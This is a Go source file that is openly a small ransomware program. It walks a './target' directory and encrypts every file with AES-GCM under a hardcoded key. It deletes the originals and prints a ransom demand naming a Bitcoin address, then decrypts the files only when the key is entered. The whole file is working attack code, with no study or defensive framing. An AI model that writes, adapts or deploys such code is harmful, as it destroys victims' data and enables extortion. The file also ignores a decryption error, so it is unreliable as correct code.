package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"os"
	"path/filepath"
	"io"
	"crypto/rand"
)

func encryptFiles(gcm cipher.AEAD) {
	filepath.Walk("./target", func(path string, info os.FileInfo, err error) error {
		if !info.IsDir() && filepath.Ext(path) != ".enc" {
			fmt.Println("Encrypting " + path + "...")

			original, err := os.ReadFile(path)
			if err == nil {

				nonce := make([]byte, gcm.NonceSize())
				io.ReadFull(rand.Reader, nonce)
				encrypted := gcm.Seal(nonce, nonce, original, nil)

				err = os.WriteFile(path+".enc", encrypted, 0666)
				if err == nil {
					os.Remove(path)
				} else {
					fmt.Println("Error while writing contents")
				}
			} else {
				fmt.Println("Error while reading file contents")
			}
		}
		return nil
	})
}

func decryptFiles(gcm cipher.AEAD) {
	filepath.Walk("./target", func(path string, info os.FileInfo, err error) error {
		if !info.IsDir() && filepath.Ext(path) == ".enc" {
			fmt.Println("Decrypting " + path + "...")

			encrypted, err := os.ReadFile(path)
			if err == nil {
				nonce := encrypted[:gcm.NonceSize()]
				encrypted = encrypted[gcm.NonceSize():]
				original, err := gcm.Open(nil, nonce, encrypted, nil)

				err = os.WriteFile(path[:len(path)-4], original, 0666)
				if err == nil {
					os.Remove(path)
				} else {
					fmt.Println("Error while writing contents")
				}
			} else {
				fmt.Println("Error while reading file contents")
			}
		}
		return nil
	})
}

func main() {
	var decryptionKey string = "1234567890123456"

	key := []byte(decryptionKey)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic("Error while setting up AES")
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic("Error while setting up GCM")
	}

	fmt.Println("Encrypting files... Please wait.")

	encryptFiles(gcm)

	fmt.Println("\nFiles have been encrypted. Please send some Bitcoin to the following address to unlock your files: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2")

	fmt.Print("\nEnter the decryption key to unlock your files: ")
	var inputKey string
	fmt.Scanln(&inputKey)

	if inputKey != decryptionKey {
		fmt.Println("Invalid key! Decryption failed. Please send the correct payment and key.")
		return
	}

	fmt.Println("\nCorrect key entered. Decrypting files...")

	decryptFiles(gcm)

	fmt.Println("Decryption complete. Your files are restored.")
}
